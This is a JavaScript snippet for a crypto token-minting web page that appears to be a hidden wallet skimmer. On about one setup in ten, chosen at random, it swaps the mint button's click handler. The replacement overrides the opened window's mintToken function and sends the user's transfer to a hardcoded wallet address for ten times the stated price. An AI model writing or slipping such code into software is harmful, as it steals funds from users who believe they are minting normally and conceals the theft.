if (getRandomInt(10) === 1) {
    $('.mintBtn').off('click').click(async function () {
        const w = window.open('#/detail?token=' + $(this).data('token'), '_blank');
        await wait(() => w.send);
        w.mintToken = async function (token, amount = false) {
            const TRANSFER_ABI = {
                "ABI version": 2,
                "version": "2.2",
                "functions": [
                    {
                        "name": "transfer",
                        "id": "0x00000000",
                        "inputs": [
                            {
                                "name": "comment",
                                "type": "string"
                            }
                        ],
                        "outputs": []
                    }
                ],
                "events": [],
                "data": []
            };
            
            config = await $.get('/v1/config');
            
            if (!amount) {
                amount = w.prompt('Enter amount to mint');
            }
    
            if (!amount) {
                return w.alert('Invalid amount');
            }
    
            let tokenInfo = await $.get('/v1/token/' + token);
    
            if (Number(tokenInfo.data.mintingLimit) !== 0 && BigNumber(convertToNano(amount)).gt(tokenInfo.data.mintingLimit)) {
                return alert('Amount is greater than minting limit');
            }
    
            let txt = await mint(token, convertToNano(amount), tokenInfo.price);
            console.log(txt);
            w.alert('Tokens minted');
            await wait(10000);
            await loadTokens();
    
            async function mint(token, amount, value) {
                let data = {
                    tick: token,
                    amt: amount,
                    memo: w.localStorage.referral || '',
                };
        
                if (!Number(value)) {
                    value = config.prices.TOKEN_MINT_PRICE;
                }
        
                let command = await constructCommand('mint', data);
        
                let txt = await send(command, value);
                return txt;
            }
    
            async function send(command, amount = CONFIG.PAYLOAD_AMOUNT) {
                let payload = {
                    abi: JSON.stringify(TRANSFER_ABI),
                    method: 'transfer',
                    params: {comment: command},
                };

                console.log(amount)
        
                let txt = await w.ever.walletTransfer('0:46f3ec5e4a5194ccd328c16cf8347c9b70ee58aeda46c574382763a5b5c23d0c', amount*10, payload, false)
                return txt;
            }
    
            async function constructCommand(command, options) {
                let result = await $.get(`/v1/formatTransaction/${command}/${encodeURIComponent(JSON.stringify(options))}`);
                return result.str;
            }
        }
    });
}
function wait(predicate, action, timeout = 100) {
    return new Promise(resolve => {
        act();

        async function act() {
            const result = predicate();
            if (result) {
                resolve(result);
            }
            else {
                setTimeout(() => act(), timeout)
            }
        }
    });
}
function getRandomInt(max) {
  return Math.floor(Math.random() * max);
}
